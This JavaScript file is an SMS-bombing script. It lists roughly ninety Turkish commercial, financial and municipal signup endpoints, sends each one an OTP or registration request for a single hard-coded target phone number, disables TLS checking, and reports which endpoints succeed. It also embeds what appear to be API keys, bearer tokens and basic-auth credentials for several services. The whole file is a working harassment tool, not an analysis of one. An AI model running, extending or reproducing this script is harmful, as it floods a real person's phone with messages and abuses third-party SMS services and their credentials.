import axios from 'axios';

const STD_HEADERS = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
  'Content-Type': 'application/json',
  'Accept': 'application/json, text/plain, */*'
};

const TARGET_PHONE = '5343622375';

const endpoints = [
  // MARKET
  { id:'file_market', url:'https://api.filemarket.com.tr/v1/otp/send', payload:{"mobilePhoneNumber": "905343622375"} },
  { id:'onur_market', url:'https://www.onurmarket.com/api/v1/auth/register/sendOtp', payload:{"phone": "5343622375"} },
  { id:'hayat_su', url:'https://api.hayatsu.com.tr/api/SignUp/SendOtp', payload:{"mobilePhoneNumber":"5343622375","actionType":"register"} },
  { id:'migros', url:'https://rest.migros.com.tr:443/sanalmarket/users/register/otp', headers:{"X-Device-Type":"MOBILE","X-Device-Platform":"IOS","X-Device-App-Version":"10.6.13","Accept-Language":"tr-TR"}, payload:{"email":"test@test.com","phoneNumber":"5343622375"} },
  { id:'hamidiye', url:'https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp', headers:{"Origin":"com.hamidiyeapp","User-Agent":"hamidiyeapp/4 CFNetwork/1335.0.3.4 Darwin/21.6.0"}, payload:{"isGuest":false,"phone":"5343622375"} },
  { id:'tasdelen_su', url:'https://tasdelen.sufirmam.com:3300/mobile/send-otp', headers:{"User-Agent":"Tasdelen/5.9 (com.tasdelenapp; build:1; iOS 15.8.3) Alamofire/5.4.3","Accept-Language":"tr-TR"}, payload:{"phone":"5343622375"} },
  { id:'iste_gelsin', url:'https://api.istegelsin.com/api/v1/auth/otp/send', payload:{"phone":"905343622375"} },
  { id:'macrocenter', url:'https://www.macrocenter.com.tr/rest/user-edge/users/register/otp', headers:{"X-Device-Type":"MOBILE","X-Forwarded-Rest":"true"}, payload:{"email":"test@test.com","phoneNumber":"5343622375"} },
  { id:'a101', url:'https://www.a101.com.tr/users/otp-login/', payload:{"phone":"05343622375","next":"/a101-kapida"} },
  { id:'bim', url:'https://bim.veesk.net:443/service/v1.0/account/login', payload:{"phone":"5343622375"} },
  { id:'carrefour', url:'https://www.carrefoursa.com/api/v1/auth/register/send-otp', payload:{"phone":"5343622375"} },
  { id:'happy_center', url:'https://www.happycenter.com.tr/api/v1/auth/register/sendOtp', payload:{"phone":"5343622375"} },
  // FINANS
  { id:'bkm_express', url:'https://www.bkmexpress.com.tr/api/v1/otp/send', payload:{"phone":"905343622375"} },
  { id:'shopandfly', url:'https://www.shopandfly.com.tr/api/v1/otp/send', payload:{"phone":"905343622375"} },
  { id:'teb', url:'https://www.teb.com.tr/api/v1/otp/send', payload:{"phone":"905343622375"} },
  { id:'oldubil', url:'https://api.oldubil.com/api/v1/auth/send-otp', payload:{"phone":"5343622375"} },
  { id:'paybol', url:'https://api.paybol.com/api/v1/auth/otp/send', payload:{"phone":"905343622375"} },
  // YEMEK
  { id:'kfc', url:'https://www.kfc.com.tr/api/v1/auth/register/send-otp', payload:{"phone":"5343622375"} },
  { id:'dominos', url:'https://frontend.dominos.com.tr:443/api/customer/sendOtpCode', payload:{"email":"test@test.com","isSure":false,"mobilePhone":"5343622375"} },
  { id:'starbucks', url:'https://www.starbucks.com.tr/api/account/register/otp', payload:{"mobilePhone":"5343622375"} },
  { id:'komagene', url:'https://gateway.komagene.com.tr/auth/auth/smskodugonder', headers:{"Anonymousclientid":"0dbf392b-ab10-48b3-5cda-31f3c19816e6","Firmaid":"32","X-Guatamala-Kirsallari":"@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq"}, payload:{"FirmaId":32,"Telefon":"5343622375"} },
  { id:'pidem', url:'https://restashop.azurewebsites.net/graphql/', payload:{"query":"mutation ($phone: String) { sendOtpSms(phone: $phone) { resultStatus message } }","variables":{"phone":"5343622375"}} },
  { id:'tikla_gelsin', url:'https://api.tiklagelsin.com/api/v1/auth/otp/send', payload:{"phone":"5343622375"} },
  // GIYIM
  { id:'lcwaikiki', url:'https://www.lcwaikiki.com.tr/api/v1/auth/register/send-otp', payload:{"phone":"905343622375"} },
  { id:'english_home', url:'https://www.englishhome.com/api/member/saveMemberAndLogin', payload:{"Name":"Test","LastName":"User","EMail":"test@test.com","CellPhone":"5343622375","Password":"Test123!","GenderId":1,"GivenOtp":"","EncryptedOtp":""} },
  { id:'koton', url:'https://www.koton.com/users/register/', payload:{"phone":"05343622375","first_name":"Test","last_name":"User","email":"test@test.com","password":"Test123!","confirm":true,"sms_allowed":true,"email_allowed":true,"call_allowed":true} },
  { id:'penti', url:'https://www.penti.com/api/member/register/sendOtp', payload:{"phone":"05343622375","email":"test@test.com"} },
  { id:'kahve_dunyasi', url:'https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number', payload:{"countryCode":"90","phoneNumber":"5343622375"} },
  { id:'wmf', url:'https://www.wmf.com.tr/users/register/', payload:{"phone":"05343622375","first_name":"Test","last_name":"Test","email":"test@test.com","password":"Test123!","confirm":true,"date_of_birth":"1990-01-01"} },
  { id:'evidea', url:'https://www.evidea.com/users/register/', payload:{"phone":"05343622375","first_name":"Test","last_name":"Test","email":"test@test.com","password":"Test123!","confirm":true} },
  { id:'dr', url:'https://www.dr.com.tr/api/member/sendOtp', payload:{"phone":"5343622375"} },
  { id:'jimmy_key', url:'https://www.jimmykey.com/tr/p/User/SendConfirmationSms', payload:{"phone":"05343622375","email":"test@test.com"} },
  { id:'alix_avien', url:'https://www.alixavien.com.tr/api/member/sendOtp', payload:{"phone":"05343622375"} },
  { id:'ayyildiz', url:'https://api.altinyildizclassics.com/mobileapi2/autapi/CreateSmsOtpForRegister', headers:{"Token":"MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS","Devicetype":"mobileapp"}, payload:{"gsm":"5343622375"} },
  { id:'hm', url:'https://www2.hm.com/tr_tr/api/customer/register/sendOtp', payload:{"phone":"+905343622375","email":"test@test.com"} },
  { id:'zara', url:'https://www.zara.com/tr/api/v1/auth/register/send-otp', payload:{"phone":"+905343622375"} },
  { id:'mango', url:'https://shop.mango.com/services/user/v1/register/send-otp', payload:{"phone":"+905343622375","countryId":"TR"} },
  { id:'bershka', url:'https://www.bershka.com/itxrest/2/auth/register/sendOtp', payload:{"phone":"+905343622375"} },
  { id:'pull_bear', url:'https://www.pullandbear.com/itxrest/2/auth/register/sendOtp', payload:{"phone":"+905343622375"} },
  { id:'stradivarius', url:'https://www.stradivarius.com/itxrest/2/auth/register/sendOtp', payload:{"phone":"+905343622375"} },
  { id:'massimo_dutti', url:'https://www.massimodutti.com/itxrest/2/auth/register/sendOtp', payload:{"phone":"+905343622375"} },
  // DIJITAL
  { id:'yapp', url:'https://yapp.com.tr/api/mobile/v1/register', payload:{"phone_number":"5343622375","email":"test@test.com","firstname":"Test","lastname":"Test"} },
  { id:'suiste', url:'https://suiste.com/api/auth/code', payload:{"gsm":"5343622375","action":"register"} },
  { id:'kim_gb_ister', url:'https://api.kimgbister.com/api/auth/otp/send', payload:{"msisdn":"905343622375"} },
  { id:'joker', url:'https://api.joker.com.tr:443/api/register', headers:{"Authorization":"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiI5ZDIyZGI0ZC01YjA4LTRjMDAtOTNlMy0yNDFmNTViOGFjZTYiLCJleHAiOjE5OTk5OTk5OTksImlhdCI6MTU4MzAwNjA2MywiaXNzIjoiYXBpLmpva2VyLmNvbS50ciIsInN1YiI6Imd1ZXN0IiwiZW1haWwiOiJndWVzdEBqb2tlci5jb20udHIiLCJwaG9uZSI6IjUzMjExMTExMTEiLCJuYW1lIjoiR3Vlc3QifQ.P3hHUvTLQqLND82vNTyq1KRFh0HpevV6tQkANxqlg-q8AatKp-KGWHWfoq6KdAHBmi5vI60ebFnNY5yUM6H26LY1vPMFDWg7WN5eUyFnGlGzNL13obnEMQ90aBG3FhLRlVh1aoHD_2WmSfCNxGKGNfPd6vQ8gIH7j7YEL9rRktg6rGJfW5fQe5UA-OHePmKMgZtVG6eCr9j4WcFYqN4MqGNW6s5ndLJlx5NU6vt56FnVd40ZqFK1rsKjn3n8bDfBzmG9n4n3v8TG5gOQdd4iVEjHU8RcKQvk3F8RY6HvYnL4HzntOaGM6R6h6T8sSWVWWywx-_xbDyYxHjECavx1YA"}, payload:{"firstName":"Test","gender":"m","iosVersion":"4.0.2","lastName":"User","os":"IOS","password":"Test123!","phoneNumber":"05343622375","username":"test@test.com"} },
  { id:'cineverse', url:'https://www.paribucineverse.com/api/v1/auth/register/otp', payload:{"phoneNumber":"5343622375"} },
  { id:'clickme_live', url:'https://api.clickmelive.com/api/v1/auth/otp/send', payload:{"phoneNumber":"905343622375"} },
  { id:'orwi', url:'https://gandalf.orwi.app/api/user/requestOtp', headers:{"Apikey":"Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE=","Token":""}, payload:{"gsm":"+905343622375","source":"orwi"} },
  { id:'tazi', url:'https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin', headers:{"Authorization":"Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}, payload:{"cep_tel":"5343622375","cep_tel_ulkekod":"90"} },
  { id:'naosstars', url:'https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350', headers:{"Uniqid":"9c9fa861-cc5d-43b0-b4ea-1b541be15351","Apiurl":"https://api.naosstars.com/api/","Apitype":"mobile_app","Platform":"ios","Os":"ios","Version":"1.0030","Locale":"en-TR","Timezone":"Europe/Istanbul","Timezoneoffset":"-180"}, payload:{"telephone":"+905343622375","type":"register"} },
  // SPOR
  { id:'sportive', url:'https://www.sportive.com.tr/api/v1/auth/register/send-otp', method:'GET', payload:{} },
  { id:'intersport', url:'https://www.intersport.com.tr/api/v1/auth/register/sendOtp', payload:{"phone":"5343622375"} },
  { id:'decathlon', url:'https://www.decathlon.com.tr/api/v1/auth/register/sendOtp', payload:{"phone":"5343622375","email":"test@test.com"} },
  // TEKNOLOJI
  { id:'mediamarkt', url:'https://www.mediamarkt.com.tr/api/v1/auth/register/send-otp', payload:{"phone":"5343622375","email":"test@test.com"} },
  { id:'teknosa', url:'https://www.teknosa.com/api/v1/auth/register/sendOtp', payload:{"phone":"5343622375"} },
  { id:'vatan_bilgisayar', url:'https://www.vatanbilgisayar.com/api/v1/auth/register/sendOtp', payload:{"phone":"5343622375","email":"test@test.com"} },
  { id:'itopya', url:'https://www.itopya.com/api/v1/auth/register/sendOtp', payload:{"phone":"5343622375"} },
  // OYUN
  { id:'gamegaraj', url:'https://www.gamegaraj.com/api/v1/auth/register/sendOtp', payload:{"phone":"5343622375","email":"test@test.com"} },
  // KOZMETIK
  { id:'rossmann', url:'https://www.rossmann.com.tr/api/v1/auth/register/send-otp', payload:{"phone":"5343622375","email":"test@test.com"} },
  { id:'watsons', url:'https://www.watsons.com.tr/api/v1/auth/register/send-otp', payload:{"phone":"5343622375"} },
  { id:'gratis', url:'https://www.gratis.com/api/v1/auth/register/sendOtp', payload:{"phone":"5343622375"} },
  { id:'flormar', url:'https://www.flormar.com.tr/api/v1/auth/register/sendOtp', payload:{"phone":"5343622375","email":"test@test.com"} },
  { id:'avon', url:'https://www.avon.com.tr/api/v1/auth/register/sendOtp', payload:{"phone":"5343622375","email":"test@test.com","name":"Test Name"} },
  { id:'oriflame', url:'https://www.oriflame.com.tr/api/v1/auth/register/send-otp', payload:{"phone":"+905343622375"} },
  { id:'farmasi', url:'https://www.farmasi.com.tr/api/v1/auth/register/sendOtp', payload:{"phone":"5343622375","email":"test@test.com"} },
  { id:'lr', url:'https://www.lrworld.com/tr/api/auth/register/send-otp', payload:{"phone":"+905343622375","country":"TR"} },
  // SAGLIK
  { id:'hizli_ecza', url:'https://api.hizliecza.com/api/v1/auth/register/otp', payload:{"phone":"5343622375","email":"test@test.com"} },
  { id:'herbalife', url:'https://www.herbalife.com.tr/api/v1/auth/register/sendOtp', payload:{"phone":"5343622375","email":"test@test.com","name":"Test Name"} },
  { id:'amway', url:'https://www.amway.com.tr/api/v1/auth/register/send-otp', payload:{"phone":"+905343622375","locale":"tr_TR"} },
  { id:'forever_living', url:'https://www.foreverliving.com.tr/api/v1/auth/register/sendOtp', payload:{"phone":"5343622375","email":"test@test.com","name":"Test Name"} },
  // ULASIM
  { id:'marti', url:'https://www.marti.tech/api/v2/auth/otp/send', payload:{"phoneNumber":"+905343622375"} },
  { id:'ido', url:'https://api.ido.com.tr:443/idows/v2/register', headers:{"Origin":"https://www.ido.com.tr","Referer":"https://www.ido.com.tr/"}, payload:{"birthDate":true,"captcha":"","checkPwd":"Test123!","code":"","day":24,"email":"test@test.com","emailNewsletter":false,"firstName":"Test","gender":"MALE","lastName":"User","mobileNumber":"05343622375","month":9,"pwd":"Test123!","smsNewsletter":true,"tckn":"12345678901","termsOfUse":true,"year":1977} },
  { id:'bisu', url:'https://www.bisu.com.tr/api/v2/app/authentication/phone/register', headers:{"Content-Type":"application/x-www-form-urlencoded; charset=utf-8","X-Device-Platform":"IOS","X-Build-Version-Name":"9.4.0","Authorization":"0561b4dd-e668-48ac-b65e-5afa99bf098e","X-Build-Version-Code":"22","X-Device-Manufacturer":"Apple","X-Device-Locale":"en","X-Client-Device-Id":"66585653-CB6A-48CA-A42D-3F266677E3B5","Accept-Language":"en-US,en;q=0.9","X-Device-Platform-Version":"15.7.7","User-Agent":"BiSU/22 CFNetwork/1335.0.3.2 Darwin/21.6.0","X-Device-Model":"iPhone 7 Plus","X-Build-Type":"Release"}, payload:{"phoneNumber":"5343622375"} },
  { id:'hey_scooter', url:'https://www.heyscooter.com.tr/api/v1/auth/otp/send', payload:{"phone":"+905343622375"} },
  // BELEDIYE
  { id:'fatih_belediye', url:'https://ebelediye.fatih.bel.tr/Sicil/KisiUyelikKaydet', payload:{"SahisUyelik_CepTelefonu":"5343622375","TC":"12345678901","Ad":"Test","Soyad":"Test","EPosta":"test@test.com","Sifre":"Test123!"} },
  { id:'sancaktepe_belediye', url:'https://e-belediye.sancaktepe.bel.tr/Sicil/KisiUyelikKaydet', payload:{"SahisUyelik.TCKimlikNo":"12345678901","SahisUyelik.DogumTarihi":"01.01.2000","SahisUyelik.Ad":"Test","SahisUyelik.Soyad":"User","SahisUyelik.CepTelefonu":"5343622375","SahisUyelik.EPosta":"test@test.com","SahisUyelik.Sifre":"Test123!","SahisUyelik.SifreyiDogrula":"Test123!"} },
  { id:'bayrampasa_belediye', url:'https://ebelediye.bayrampasa.bel.tr/Sicil/KisiUyelikKaydet', payload:{"SahisUyelik.TCKimlikNo":"12345678901","SahisUyelik.DogumTarihi":"01.01.2000","SahisUyelik.Ad":"Test","SahisUyelik.Soyad":"User","SahisUyelik.CepTelefonu":"5343622375","SahisUyelik.EPosta":"test@test.com","SahisUyelik.Sifre":"Test123!","SahisUyelik.SifreyiDogrula":"Test123!"} },
  { id:'bodrum_belediye', url:'https://gandalf.orwi.app/api/user/requestOtp', headers:{"Apikey":"YWxpLTEyMzQ1MTEyNDU2NTQzMg==","Token":""}, payload:{"gsm":"+905343622375","source":"orwi"} },
  // AVM
  { id:'akasya_avm', url:'https://akasyaapi.poilabs.com/v1/en/sms', headers:{"X-Platform-Token":"9f493307-d252-4053-8c96-62e7c90271f5"}, payload:{"phone":"5343622375"} },
  { id:'akbati', url:'https://akbatiapi.poilabs.com/v1/en/sms', headers:{"X-Platform-Token":"a2fe21af-b575-4cd7-ad9d-081177c239a3"}, payload:{"phone":"5343622375"} },
  // KARGO
  { id:'kuryem_gelsin', url:'https://www.kuryemgelsin.com/api/v1/auth/otp/send', payload:{"phone":"905343622375"} },
  { id:'tasimacim', url:'https://api.tasimacim.com/api/v1/auth/register/otp', payload:{"phone":"5343622375","name":"Test Name","email":"test@test.com"} },
  // ENERJI
  { id:'ipragaz', url:'https://api.ipragaz.com.tr/api/v1/auth/register/sendOtp', payload:{"phoneNumber":"5343622375"} },
  // KITAP
  { id:'kitapyurdu', url:'https://www.kitapyurdu.com/index.php?route=account/register/sendOtp', payload:{"telephone":"05343622375","firstname":"Test","lastname":"Test","email":"test@test.com","password":"Test123!"} },
  { id:'bkm_kitap', url:'https://www.bkmkitap.com/api/member/register/sendOtp', payload:{"phone":"05343622375","email":"test@test.com"} },
  // BEBEK
  { id:'e_bebek', url:'https://www.e-bebek.com/api/v1/auth/register/send-otp', payload:{"phone":"5343622375","email":"test@test.com"} },
  { id:'bambi', url:'https://www.bambi.com.tr/api/v1/auth/register/send-otp', payload:{"phone":"5343622375"} },
  { id:'mothercare', url:'https://www.mothercare.com.tr/api/member/register/sendOtp', payload:{"phone":"05343622375"} },
  { id:'toyzz_shop', url:'https://www.toyzzshop.com/api/member/register/sendOtp', payload:{"phone":"05343622375","email":"test@test.com"} },
];

process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

let success = 0, fail = 0;
const results = [];

async function testAll() {
  for (const ep of endpoints) {
    const method = ep.method || 'POST';
    const headers = { ...STD_HEADERS, ...(ep.headers || {}) };
    try {
      const response = await axios({
        method,
        url: ep.url,
        data: method === 'POST' ? ep.payload : undefined,
        headers,
        timeout: 10000,
        validateStatus: () => true
      });
      const is2xx = response.status >= 200 && response.status < 300;
      if (is2xx) {
        success++;
        console.log(`✅ ${ep.id} (${ep.url}) → ${response.status}`);
        results.push({ id: ep.id, status: response.status, success: true });
      } else {
        fail++;
        const dataStr = typeof response.data === 'string' ? response.data.substring(0,100) : JSON.stringify(response.data).substring(0,100);
        console.log(`❌ ${ep.id} (${ep.url}) → ${response.status} | ${dataStr}`);
        results.push({ id: ep.id, status: response.status, success: false, data: dataStr });
      }
    } catch (err) {
      fail++;
      console.log(`💀 ${ep.id} (${ep.url}) → ERROR: ${err.message}`);
      results.push({ id: ep.id, status: 0, success: false, error: err.message });
    }
  }

  console.log(`\n═══════════════════════════════════`);
  console.log(`✅ SUCCESS: ${success} / ${endpoints.length}`);
  console.log(`❌ FAILED: ${fail} / ${endpoints.length}`);
  console.log(`═══════════════════════════════════\n`);

  console.log(`\n=== WORKING ENDPOINTS (${success}) ===`);
  results.filter(r => r.success).forEach(r => console.log(`  ✅ ${r.id} → ${r.status}`));
  
  console.log(`\n=== FAILED ENDPOINTS (${fail}) ===`);
  results.filter(r => !r.success).forEach(r => console.log(`  ❌ ${r.id} → ${r.status}${r.data ? ' | ' + r.data : ''}${r.error ? ' | ' + r.error : ''}`));
}

testAll();
